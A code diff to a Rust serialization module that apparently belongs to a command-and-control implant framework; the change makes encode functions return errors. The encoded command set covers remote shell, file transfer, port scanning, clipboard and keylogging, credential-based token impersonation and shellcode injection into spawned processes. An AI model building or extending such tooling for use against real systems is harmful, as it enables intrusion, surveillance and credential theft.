@@ -55,14 +55,15 @@ pub struct SessionInfo {
 }
 
 impl SessionInfo {
-    pub fn encode(&self, w: &mut Writer) {
+    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
         w.u32(self.beacon_id);
-        w.str(&self.hostname);
-        w.str(&self.username);
-        w.str(&self.os);
+        w.str(&self.hostname)?;
+        w.str(&self.username)?;
+        w.str(&self.os)?;
         w.u8(self.arch);
         w.u32(self.pid);
         w.u8(self.is_admin);
+        Ok(())
     }
 
     pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
@@ -253,7 +254,7 @@ impl FileOp {
 }
 
 impl Command {
-    pub fn encode(&self, w: &mut Writer) {
+    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
         match self {
             Command::Ping => w.u8(1),
             Command::Sleep {
@@ -266,26 +267,26 @@ impl Command {
             }
             Command::Shell { args } => {
                 w.u8(3);
-                w.str(args);
+                w.str(args)?;
             }
             Command::Upload { name, data } => {
                 w.u8(4);
-                w.str(name);
-                w.blob(data);
+                w.str(name)?;
+                w.blob(data)?;
             }
             Command::Download { path } => {
                 w.u8(5);
-                w.str(path);
+                w.str(path)?;
             }
             Command::Exit => w.u8(6),
             Command::Bof { name, args, blob } => {
                 w.u8(7);
-                w.str(name);
+                w.str(name)?;
                 w.u32(args.len().min(MAX_WIRE_COUNT) as u32);
                 for a in args.iter().take(MAX_WIRE_COUNT) {
-                    w.str(a);
+                    w.str(a)?;
                 }
-                w.blob(blob);
+                w.blob(blob)?;
             }
             Command::Connect {
                 proto,
@@ -295,7 +296,7 @@ impl Command {
             } => {
                 w.u8(8);
                 w.u8(*proto);
-                w.str(host);
+                w.str(host)?;
                 w.u16(*port);
                 w.u32(*chan);
             }
@@ -308,17 +309,17 @@ impl Command {
                 w.u8(9);
                 w.u32(*chan);
                 w.u8(*op);
-                w.str(addr);
+                w.str(addr)?;
                 w.u16(*port);
             }
             Command::FileOp { op, path, dest } => {
                 w.u8(10);
                 op.encode(w);
-                w.str(path);
+                w.str(path)?;
                 match dest {
                     Some(d) => {
                         w.u8(1);
-                        w.str(d);
+                        w.str(d)?;
                     }
                     None => w.u8(0),
                 }
@@ -329,18 +330,18 @@ impl Command {
             }
             Command::Portscan { host, ports } => {
                 w.u8(12);
-                w.str(host);
-                w.str(ports);
+                w.str(host)?;
+                w.str(ports)?;
             }
             Command::Net { query } => {
                 w.u8(13);
-                w.str(query);
+                w.str(query)?;
             }
             Command::DriveInfo => w.u8(14),
             Command::Clipboard => w.u8(15),
             Command::Env { name } => {
                 w.u8(16);
-                w.str(name);
+                w.str(name)?;
             }
             Command::Keylog { action } => {
                 w.u8(17);
@@ -357,7 +358,7 @@ impl Command {
             Command::ChannelData { chan, data } => {
                 w.u8(20);
                 w.u32(*chan);
-                w.blob(data);
+                w.blob(data)?;
             }
             Command::ChannelClose { chan } => {
                 w.u8(21);
@@ -374,9 +375,9 @@ impl Command {
                 logon_type,
             } => {
                 w.u8(23);
-                w.str(domain);
-                w.str(user);
-                w.str(password);
+                w.str(domain)?;
+                w.str(user)?;
+                w.str(password)?;
                 w.u8(*logon_type);
             }
             Command::Rev2Self => w.u8(24),
@@ -390,10 +391,11 @@ impl Command {
                 w.u8(26);
                 w.u8(*method);
                 w.u32(*pid);
-                w.str(spawn_to);
-                w.blob(shellcode);
+                w.str(spawn_to)?;
+                w.blob(shellcode)?;
             }
         }
+        Ok(())
     }
 
     pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
@@ -514,16 +516,16 @@ pub enum Response {
 }
 
 impl Response {
-    pub fn encode(&self, w: &mut Writer) {
+    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
         match self {
             Response::Output(d) => {
                 w.u8(1);
-                w.blob(d);
+                w.blob(d)?;
             }
             Response::Ok => w.u8(2),
             Response::Err(m) => {
                 w.u8(3);
-                w.str(m);
+                w.str(m)?;
             }
             Response::FileChunk {
                 name,
@@ -532,26 +534,27 @@ impl Response {
                 data,
             } => {
                 w.u8(4);
-                w.str(name);
+                w.str(name)?;
                 w.u32(*seq);
                 w.u8(*eof);
-                w.blob(data);
+                w.blob(data)?;
             }
             Response::BofOutput(d) => {
                 w.u8(5);
-                w.blob(d);
+                w.blob(d)?;
             }
             Response::Channel { chan, status, data } => {
                 w.u8(6);
                 w.u32(*chan);
                 w.u8(*status);
-                w.blob(data);
+                w.blob(data)?;
             }
             Response::Image(d) => {
                 w.u8(7);
-                w.blob(d);
+                w.blob(d)?;
             }
         }
+        Ok(())
     }
 
     pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
@@ -593,9 +596,10 @@ pub struct Task {
 }
 
 impl Task {
-    pub fn encode(&self, w: &mut Writer) {
+    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
         w.u64(self.task_id);
-        self.command.encode(w);
+        self.command.encode(w)?;
+        Ok(())
     }
 
     pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
@@ -605,14 +609,15 @@ impl Task {
         })
     }
 
-    /// Encode a batch: `u32 count` followed by each task.
-    pub fn encode_vec(tasks: &[Task]) -> Vec<u8> {
+    /// Encode a batch: `u32 count` followed by each task. Returns the first
+    /// writer error encountered (e.g. a blob exceeding `wire::MAX_BLOB_LEN`).
+    pub fn encode_vec(tasks: &[Task]) -> Result<Vec<u8>, WireError> {
         let mut w = Writer::new();
         w.u32(tasks.len().min(MAX_WIRE_COUNT) as u32);
         for t in tasks.iter().take(MAX_WIRE_COUNT) {
-            t.encode(&mut w);
+            t.encode(&mut w)?;
         }
-        w.into_bytes()
+        Ok(w.into_bytes())
     }
 
     pub fn decode_vec(data: &[u8]) -> Result<Vec<Task>, WireError> {
@@ -635,9 +640,10 @@ pub struct TaskResponse {
 }
 
 impl TaskResponse {
-    pub fn encode(&self, w: &mut Writer) {
+    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
         w.u64(self.task_id);
-        self.response.encode(w);
+        self.response.encode(w)?;
+        Ok(())
     }
 
     pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
@@ -647,13 +653,13 @@ impl TaskResponse {
         })
     }
 
-    pub fn encode_vec(rs: &[TaskResponse]) -> Vec<u8> {
+    pub fn encode_vec(rs: &[TaskResponse]) -> Result<Vec<u8>, WireError> {
         let mut w = Writer::new();
         w.u32(rs.len().min(MAX_BATCH) as u32);
         for r in rs.iter().take(MAX_BATCH) {
-            r.encode(&mut w);
+            r.encode(&mut w)?;
         }
-        w.into_bytes()
+        Ok(w.into_bytes())
     }
 
     pub fn decode_vec(data: &[u8]) -> Result<Vec<TaskResponse>, WireError> {
@@ -681,7 +687,8 @@ mod tests {
     /// 编码再解码一个 Command，验证 round-trip 相等。
     fn round_trip(cmd: Command) -> Command {
         let mut w = Writer::new();
-        cmd.encode(&mut w);
+        cmd.encode(&mut w)
+            .expect("encode should succeed for test fixture");
         let bytes = w.into_bytes();
         let mut r = Reader::new(&bytes);
         Command::decode(&mut r).expect("decode 应成功")
@@ -801,7 +808,8 @@ mod tests {
         let png = vec![0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A]; // PNG header
         let resp = Response::Image(png.clone());
         let mut w = Writer::new();
-        resp.encode(&mut w);
+        resp.encode(&mut w)
+            .expect("encode should succeed for test fixture");
         let bytes = w.into_bytes();
         let mut r = Reader::new(&bytes);
         let decoded = Response::decode(&mut r).unwrap();
